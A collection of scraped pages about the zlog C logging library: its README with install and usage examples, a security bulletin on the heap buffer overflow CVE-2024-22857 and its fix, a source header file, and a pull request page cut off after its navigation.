=== Content from github.com_83483bdb_20250111_100015.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHardySimpson%2Fzlog%2F)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHardySimpson%2Fzlog%2F)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=HardySimpson%2Fzlog)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[HardySimpson](/HardySimpson)
/
**[zlog](/HardySimpson/zlog)**
Public

* [Notifications](/login?return_to=%2FHardySimpson%2Fzlog) You must be signed in to change notification settings
* [Fork
  725](/login?return_to=%2FHardySimpson%2Fzlog)
* [Star
   2.3k](/login?return_to=%2FHardySimpson%2Fzlog)

A reliable, high-performance, thread safe, flexsible, clear-model, pure C logging library.

### License

[Apache-2.0 license](/HardySimpson/zlog/blob/master/LICENSE)

[2.3k
stars](/HardySimpson/zlog/stargazers) [725
forks](/HardySimpson/zlog/forks) [Branches](/HardySimpson/zlog/branches) [Tags](/HardySimpson/zlog/tags) [Activity](/HardySimpson/zlog/activity)
 [Star](/login?return_to=%2FHardySimpson%2Fzlog)

 [Notifications](/login?return_to=%2FHardySimpson%2Fzlog) You must be signed in to change notification settings

* [Code](/HardySimpson/zlog)
* [Issues
  121](/HardySimpson/zlog/issues)
* [Pull requests
  7](/HardySimpson/zlog/pulls)
* [Actions](/HardySimpson/zlog/actions)
* [Projects
  0](/HardySimpson/zlog/projects)
* [Wiki](/HardySimpson/zlog/wiki)
* [Security](/HardySimpson/zlog/security)
* [Insights](/HardySimpson/zlog/pulse)

Additional navigation options

* [Code](/HardySimpson/zlog)
* [Issues](/HardySimpson/zlog/issues)
* [Pull requests](/HardySimpson/zlog/pulls)
* [Actions](/HardySimpson/zlog/actions)
* [Projects](/HardySimpson/zlog/projects)
* [Wiki](/HardySimpson/zlog/wiki)
* [Security](/HardySimpson/zlog/security)
* [Insights](/HardySimpson/zlog/pulse)

# HardySimpson/zlog

    master[Branches](/HardySimpson/zlog/branches)[Tags](/HardySimpson/zlog/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[373 Commits](/HardySimpson/zlog/commits/master/) | | |
| [cmake](/HardySimpson/zlog/tree/master/cmake "cmake") | | [cmake](/HardySimpson/zlog/tree/master/cmake "cmake") |  |  |
| [cpack](/HardySimpson/zlog/tree/master/cpack "cpack") | | [cpack](/HardySimpson/zlog/tree/master/cpack "cpack") |  |  |
| [doc](/HardySimpson/zlog/tree/master/doc "doc") | | [doc](/HardySimpson/zlog/tree/master/doc "doc") |  |  |
| [src](/HardySimpson/zlog/tree/master/src "src") | | [src](/HardySimpson/zlog/tree/master/src "src") |  |  |
| [test](/HardySimpson/zlog/tree/master/test "test") | | [test](/HardySimpson/zlog/tree/master/test "test") |  |  |
| [tools](/HardySimpson/zlog/tree/master/tools "tools") | | [tools](/HardySimpson/zlog/tree/master/tools "tools") |  |  |
| [.clang-format](/HardySimpson/zlog/blob/master/.clang-format ".clang-format") | | [.clang-format](/HardySimpson/zlog/blob/master/.clang-format ".clang-format") |  |  |
| [.gitignore](/HardySimpson/zlog/blob/master/.gitignore ".gitignore") | | [.gitignore](/HardySimpson/zlog/blob/master/.gitignore ".gitignore") |  |  |
| [BUILD.bazel](/HardySimpson/zlog/blob/master/BUILD.bazel "BUILD.bazel") | | [BUILD.bazel](/HardySimpson/zlog/blob/master/BUILD.bazel "BUILD.bazel") |  |  |
| [CMakeLists.txt](/HardySimpson/zlog/blob/master/CMakeLists.txt "CMakeLists.txt") | | [CMakeLists.txt](/HardySimpson/zlog/blob/master/CMakeLists.txt "CMakeLists.txt") |  |  |
| [Changelog](/HardySimpson/zlog/blob/master/Changelog "Changelog") | | [Changelog](/HardySimpson/zlog/blob/master/Changelog "Changelog") |  |  |
| [INSTALL](/HardySimpson/zlog/blob/master/INSTALL "INSTALL") | | [INSTALL](/HardySimpson/zlog/blob/master/INSTALL "INSTALL") |  |  |
| [LICENSE](/HardySimpson/zlog/blob/master/LICENSE "LICENSE") | | [LICENSE](/HardySimpson/zlog/blob/master/LICENSE "LICENSE") |  |  |
| [Makefile](/HardySimpson/zlog/blob/master/Makefile "Makefile") | | [Makefile](/HardySimpson/zlog/blob/master/Makefile "Makefile") |  |  |
| [README.md](/HardySimpson/zlog/blob/master/README.md "README.md") | | [README.md](/HardySimpson/zlog/blob/master/README.md "README.md") |  |  |
| [TODO](/HardySimpson/zlog/blob/master/TODO "TODO") | | [TODO](/HardySimpson/zlog/blob/master/TODO "TODO") |  |  |
| [zlog.spec](/HardySimpson/zlog/blob/master/zlog.spec "zlog.spec") | | [zlog.spec](/HardySimpson/zlog/blob/master/zlog.spec "zlog.spec") |  |  |
| View all files | | |

## Repository files navigation

* README
* Apache-2.0 license
# zlog

zlog is a reliable, high-performance, thread safe, flexible, clear-model, pure C logging library.

Actually, in the C world there was NO good logging library for applications like logback in java or log4cxx in c++.
Using printf can work, but can not be redirected or reformatted easily. syslog is slow and is designed for system use.
So I wrote zlog.
It is faster, safer and more powerful than log4c. So it can be widely used.

## 1. Install

Downloads: <https://github.com/HardySimpson/zlog/releases>

```
tar -zxvf zlog-latest-stable.tar.gz
cd zlog-latest-stable/
make
sudo make install
```

Or

```
make PREFIX=/usr/local/
sudo make PREFIX=/usr/local/ install
```

PREFIX indicates the installation destination for zlog. After installation, refresh your dynamic linker to make sure
your program can find zlog library.

```
$ sudo vi /etc/ld.so.conf
/usr/local/lib
$ sudo ldconfig
```

Before running a real program, make sure libzlog.so is in the directory where the system's dynamic lib loader can find
it. The command metioned above are for linux. Other systems will need a similar set of actions.

## 2. Configuration file

There are 3 important concepts in zlog: categories, formats and rules.

Categories specify different kinds of log entries. In the zlog source code, category is a `zlog_category_t *` variable.
In your program, different categories for the log entries will distinguish them from each other.

Formats describe log patterns, such as: with or without time stamp, source file, source line.

Rules consist of category, level, output file (or other channel) and format. In brief, if the category string in a rule
in the configuration file equals the name of a category variable in the source, then they match. Still there is complex
match range of category. Rule decouples variable conditions. For example, log4j must specify a level for each logger(or
inherit from father logger). That's not convenient when each grade of logger has its own level for output(child logger
output at the level of debug, when father logger output at the level of error)

Now create a configuration file. The function zlog\_init takes the files path as its only argument.

```
$ cat /etc/zlog.conf

[formats]
simple = "%m%n"
[rules]
my_cat.DEBUG    >stdout; simple
```

In the configuration file log messages in the category `my_cat` and a level of DEBUG or higher are output to standard
output, with the format of simple `%m - usermessage %n - newline`. If you want to direct out to a file and limit the
files maximum size, use this configuration

```
my_cat.DEBUG            "/var/log/aa.log", 1M; simple

```

## 3. Using zlog API in C source file

### 3.1 Sample code

```
$ vi test_hello.c

#include <stdio.h>

#include "zlog.h"

int main(int argc, char** argv)
{
    int rc;
    zlog_category_t *c;

    rc = zlog_init("/etc/zlog.conf");
    if (rc) {
    printf("init failed\n");
    return -1;
    }

    c = zlog_get_category("my_cat");
    if (!c) {
    printf("get cat fail\n");
    zlog_fini();
    return -2;
    }

    zlog_info(c, "hello, zlog");

    zlog_fini();

    return 0;
}
```

### 3.2 Compile, and run it

```
$ cc -c -o test_hello.o test_hello.c -I/usr/local/include
$ cc -o test_hello test_hello.o -L/usr/local/lib -lzlog -lpthread
$ ./test_hello
hello, zlog
```

## 4. Advanced Usage

* syslog model, better than log4j model
* log format customization
* multiple output destinations including static file path, dynamic file path, stdout, stderr, syslog, user-defined
  output
* runtime manually or automatically refresh configure(safely)
* high-performance, 250'000 logs/second on my laptop, about 1000 times faster than syslog(3) with rsyslogd
* user-defined log level
* thread-safe and process-safe log file rotation
* microsecond accuracy
* dzlog, a default category log API for easy use
* MDC, a log4j style key-value map
* self debuggable, can output zlog's self debug&error log at runtime
* No external dependencies, just based on a POSIX system and a C99 compliant vsnprintf.

## 5. Reference

* Homepage: <http://hardysimpson.github.io/zlog>
* Downloads: <https://github.com/HardySimpson/zlog/releases>
* Author's Email: HardySimpson1984@gmail.com
* Auto tools version: <https://github.com/bmanojlovic/zlog>
* CMake verion: <https://github.com/lisongmin/zlog>
* Windows version: <https://github.com/lopsd07/WinZlog>

## About

A reliable, high-performance, thread safe, flexsible, clear-model, pure C logging library.

### Resources

[Readme](#readme-ov-file)
### License

[Apache-2.0 license](#Apache-2.0-1-ov-file)

[Activity](/HardySimpson/zlog/activity)
### Stars

[**2.3k**
stars](/HardySimpson/zlog/stargazers)
### Watchers

[**136**
watching](/HardySimpson/zlog/watchers)
### Forks

[**725**
forks](/HardySimpson/zlog/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FHardySimpson%2Fzlog&report=HardySimpson+%28user%29)

## [Releases 5](/HardySimpson/zlog/releases)

[1.2.18
Latest

Jul 3, 2024](/HardySimpson/zlog/releases/tag/1.2.18)
[+ 4 releases](/HardySimpson/zlog/releases)

## [Packages 0](/users/HardySimpson/packages?repo_name=zlog)

No packages published

## [Contributors 45](/HardySimpson/zlog/graphs/contributors)

[+ 31 contributors](/HardySimpson/zlog/graphs/contributors)

## Languages

* [C
  92.8%](/HardySimpson/zlog/search?l=c)
* [CMake
  3.9%](/HardySimpson/zlog/search?l=cmake)
* [Makefile
  3.0%](/HardySimpson/zlog/search?l=makefile)
* Other
  0.3%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.cybersecurity-help.cz_c7de6e6b_20250111_100017.html ===


[Register](/dashboard/register/)
[Login](/dashboard/login/)

Toggle navigation

[![](/images/logo_ua.png)](/)

* [SaaS Solutions](/saas_solutions/)
  + [Vulnerability Intelligence](/security-services/vulnerability-intelligence.html)
  + [Vulnerability Management](/security-services/vulnerability_management.php)
* [Pricing](/security-services/pricing.php)
* [Vulnerabilities](/vdb/)
* [Reports](/reports/)
* [Blog](/blog/)
* [Contact Us](/contacts/)

1. [Main](/ "Main")
2. [Vulnerability Database](/vdb/ "Vulnerability Database")

# Remote code execution in zlog

[Cybersecurity Help s.r.o.](https://www.cybersecurity-help.cz/)

**Published:** 2024-02-28
| **Updated:** 2024-07-04

| Risk | **High** |
| --- | --- |
| Patch available | **YES** |
| Number of vulnerabilities | 1 |
| CVE-ID | CVE-2024-22857 |
| CWE-ID | CWE-122 |
| Exploitation vector | Network |
| Public exploit | N/A |
| Vulnerable software | [zlog](/vdb/HardySimpson/zlog/)  Universal components / Libraries / Libraries used by multiple products |
| Vendor | [Hardy Simpson](https://www.cybersecurity-help.cz/vdb/HardySimpson/) |

**Security Bulletin**

This security bulletin contains information about 1 vulnerabilities.

Updated 04.07.2024

Added fixed version for vulnerability #1

## 1) [Heap-based buffer overflow](https://www.cybersecurity-help.cz/vulnerabilities/86908/)

**EUVDB-ID:** [#VU86908](https://www.cybersecurity-help.cz/vulnerabilities/86908/)

**Risk:** High

**CVSSv3.1:**
[8.5 [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C]](/vdb/cvss3.1/#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C "View cvss score in calculator")

**CVE-ID:**
CVE-2024-22857

**CWE-ID:**
[CWE-122 - Heap-based Buffer Overflow](/vdb/cwe/122/)

**Exploit availability:**
No

**Description**

The vulnerability allows a remote attacker to execute arbitrary code on the target system.

The vulnerability exists due to a boundary error. A remote attacker can pass specially crafted data to the application, trigger a heap-based buffer overflow and execute arbitrary code on the target system.

Successful exploitation of this vulnerability may result in complete compromise of vulnerable system.

**Mitigation**

Install update from vendor's website.

**Vulnerable software versions**

zlog:
1.1.0 - 1.2.17

**CPE2.3**

* [cpe:2.3:a:HardySimpson:zlog:1.1.0:\*:\*:\*:\*:\*:\*:](https://www.cybersecurity-help.cz/vdb/HardySimpson/zlog/1.1.0/)
* [cpe:2.3:a:HardySimpson:zlog:1.1.1:\*:\*:\*:\*:\*:\*:](https://www.cybersecurity-help.cz/vdb/HardySimpson/zlog/1.1.1/)
* [cpe:2.3:a:HardySimpson:zlog:1.1.2:\*:\*:\*:\*:\*:\*:](https://www.cybersecurity-help.cz/vdb/HardySimpson/zlog/1.1.2/)

**External links**

<http://github.com/HardySimpson/zlog/issues/250>
<http://github.com/HardySimpson/zlog/pull/251/commits/77d8af3b368b564605f3ab34ad9b0ed6ead9b380>

**Q & A**

***Can this vulnerability be exploited remotely?***

Yes. This vulnerability can be exploited by a remote non-authenticated attacker via the Internet.

***Is there known malware, which exploits this vulnerability?***

No. We are not aware of malware exploiting this vulnerability.

###SIDEBAR###
[![](/upload/rk/0f9/99qobd6dffbog2u365ag1fugryv2mpp4.jpg)](https://war.ukraine.ua/)

![](/images/speak_bubble.png)
#### Stay Connected

* [![Twitter](/images/tw_icon.png)](https://twitter.com/Cybershelp "Twitter")
* [![Facebook](/images/fb_icon.png)](https://www.facebook.com/cybershelp/ "Facebook")
* [![Linkedin](/images/in_icon.png)](https://www.linkedin.com/company/cyber-security-help "Linkedin")
* [![Official YouTube channel of Cybersecurity Help s.r.o.](/images/yt_icon.png)](https://www.youtube.com/%40Cybersecurity-Help "Official YouTube channel of Cybersecurity Help s.r.o.")
* [![RSS](/images/rss.png)](/blog/rss/ "RSS")

##### Security Services

* [Actionable & Personalized Vulnerability Intelligence](/security-services/vulnerability-intelligence.html)
* [On-Demand Security Consulting](/security-services/on-demand-security-consulting.html)
* [Pricing](/security-services/pricing.html)

##### IT-Consulting

* [IT Infrastructure Outsourcing Services](/it-consulting/network-architecture-design.html)
* [Web Applications Support & Deployment](/it-consulting/web-applications-deployment.html)
* [On-Demand Consulting](/it-consulting/on-demand-consulting.html)

##### Partner Links

* [SSL/TLS Security Test by ImmuniWeb](https://www.immuniweb.com/ssl/)
* [Web Server Security Test by ImmuniWeb](https://www.immuniweb.com/websec/)

[![](/images/fo/seal-200.png)](https://reviews.financesonline.com/p/saas-vulnerability-scanner/)

##### Blog

* [Cyber Security Week in Review: January 10, 2025](/blog/4496.html)
* [Ivanti warns of zero-day exploits targeting critical Connect Secure flaw](/blog/4495.html)
* [NonEuclid RAT exploits UAC bypass and AMSI evasion for stealthy cyberattacks](/blog/4494.html)
* [UN’s aviation agency confirms cyberattack on recruitment database](/blog/4493.html)
* [Mirai botnet variant exploits Four-Faith industrial router Flaw for DDoS attacks](/blog/4492.html)
* [Read all articles →](/blog/)

[Contacts](/contacts/) |
[Terms of use](/terms.php) |
[Privacy Policy](/privacy.php)

[![](/images/logo_small.png)](/) © 2025 Cybersecurity Help s.r.o.



=== Content from github.com_a72b6dfd_20250111_100016.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHardySimpson%2Fzlog%2Fblob%2F1a7b1a6fb956b92a4079ccc91f30da21f34ca063%2Fsrc%2Frule.h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHardySimpson%2Fzlog%2Fblob%2F1a7b1a6fb956b92a4079ccc91f30da21f34ca063%2Fsrc%2Frule.h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=HardySimpson%2Fzlog)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[HardySimpson](/HardySimpson)
/
**[zlog](/HardySimpson/zlog)**
Public

* [Notifications](/login?return_to=%2FHardySimpson%2Fzlog) You must be signed in to change notification settings
* [Fork
  725](/login?return_to=%2FHardySimpson%2Fzlog)
* [Star
   2.3k](/login?return_to=%2FHardySimpson%2Fzlog)

* [Code](/HardySimpson/zlog)
* [Issues
  121](/HardySimpson/zlog/issues)
* [Pull requests
  7](/HardySimpson/zlog/pulls)
* [Actions](/HardySimpson/zlog/actions)
* [Projects
  0](/HardySimpson/zlog/projects)
* [Wiki](/HardySimpson/zlog/wiki)
* [Security](/HardySimpson/zlog/security)
* [Insights](/HardySimpson/zlog/pulse)

Additional navigation options

* [Code](/HardySimpson/zlog)
* [Issues](/HardySimpson/zlog/issues)
* [Pull requests](/HardySimpson/zlog/pulls)
* [Actions](/HardySimpson/zlog/actions)
* [Projects](/HardySimpson/zlog/projects)
* [Wiki](/HardySimpson/zlog/wiki)
* [Security](/HardySimpson/zlog/security)
* [Insights](/HardySimpson/zlog/pulse)

## Files

 1a7b1a6
## Breadcrumbs

1. [zlog](/HardySimpson/zlog/tree/1a7b1a6fb956b92a4079ccc91f30da21f34ca063)
2. /[src](/HardySimpson/zlog/tree/1a7b1a6fb956b92a4079ccc91f30da21f34ca063/src)
/
# rule.h

Copy path Blame  Blame
## Latest commit

## History

[History](/HardySimpson/zlog/commits/1a7b1a6fb956b92a4079ccc91f30da21f34ca063/src/rule.h)88 lines (70 loc) · 2.01 KB 1a7b1a6
## Breadcrumbs

1. [zlog](/HardySimpson/zlog/tree/1a7b1a6fb956b92a4079ccc91f30da21f34ca063)
2. /[src](/HardySimpson/zlog/tree/1a7b1a6fb956b92a4079ccc91f30da21f34ca063/src)
/
# rule.h

Top
## File metadata and controls

* Code
* Blame

88 lines (70 loc) · 2.01 KB[Raw](https://github.com/HardySimpson/zlog/raw/1a7b1a6fb956b92a4079ccc91f30da21f34ca063/src/rule.h)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788/\* \* This file is part of the zlog Library. \* \* Copyright (C) 2011 by Hardy Simpson <HardySimpson1984@gmail.com> \* \* Licensed under the LGPL v2.1, see the file COPYING in base directory. \*/
/\*\* \* @file rule.h \* @brief rule decide to output in format by category & level \*/
#ifndef \_\_zlog\_rule\_h#define \_\_zlog\_rule\_h
#include <stdio.h>#include <pthread.h>
#include "zc\_defs.h"#include "format.h"#include "thread.h"#include "rotater.h"#include "record.h"
typedef struct zlog\_rule\_s zlog\_rule\_t;
typedef int (\*zlog\_rule\_output\_fn) (zlog\_rule\_t \* a\_rule, zlog\_thread\_t \* a\_thread);
struct zlog\_rule\_s { char category[MAXLEN\_CFG\_LINE + 1]; char compare\_char; /\*  \* [\*] log all level \* [.] log level >= rule level, default \* [=] log level == rule level  \* [!] log level != rule level \*/ int level; unsigned char level\_bitmap[32]; /\* for category determine whether output or not \*/
 unsigned int file\_perms; int file\_open\_flags;
 char file\_path[MAXLEN\_PATH + 1]; zc\_arraylist\_t \*dynamic\_specs; int static\_fd; dev\_t static\_dev; ino\_t static\_ino;
 long archive\_max\_size; int archive\_max\_count; char archive\_path[MAXLEN\_PATH + 1]; zc\_arraylist\_t \*archive\_specs;
 FILE \*pipe\_fp; int pipe\_fd;
 size\_t fsync\_period; size\_t fsync\_count;
 zc\_arraylist\_t \*levels; int syslog\_facility;
 zlog\_format\_t \*format; zlog\_rule\_output\_fn output;
 char record\_name[MAXLEN\_PATH + 1]; char record\_path[MAXLEN\_PATH + 1]; zlog\_record\_fn record\_func;};
zlog\_rule\_t \*zlog\_rule\_new(char \* line, zc\_arraylist\_t \* levels, zlog\_format\_t \* default\_format, zc\_arraylist\_t \* formats, unsigned int file\_perms, size\_t fsync\_period, int \* time\_cache\_count);
void zlog\_rule\_del(zlog\_rule\_t \* a\_rule);void zlog\_rule\_profile(zlog\_rule\_t \* a\_rule, int flag);int zlog\_rule\_match\_category(zlog\_rule\_t \* a\_rule, char \*category);int zlog\_rule\_is\_wastebin(zlog\_rule\_t \* a\_rule);int zlog\_rule\_set\_record(zlog\_rule\_t \* a\_rule, zc\_hashtable\_t \*records);int zlog\_rule\_output(zlog\_rule\_t \* a\_rule, zlog\_thread\_t \* a\_thread);
#endif

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e5e20974_20250111_100017.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHardySimpson%2Fzlog%2Fpull%2F251)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHardySimpson%2Fzlog%2Fpull%2F251)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=HardySimpson%2Fzlog)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[HardySimpson](/HardySimpson)
/
**[zlog](/HardySimpson/zlog)**
Public

